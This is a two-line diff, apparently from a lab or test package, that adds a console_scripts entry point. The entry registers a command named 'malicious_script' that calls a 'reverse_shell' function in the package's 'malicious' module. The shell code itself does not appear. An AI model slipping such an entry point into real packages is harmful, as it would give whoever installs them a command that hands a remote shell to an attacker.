@@ -1,0 +1,2 @@
+[console_scripts]
+malicious_script = artifact_lab_3_package_89883da3.malicious:reverse_shell
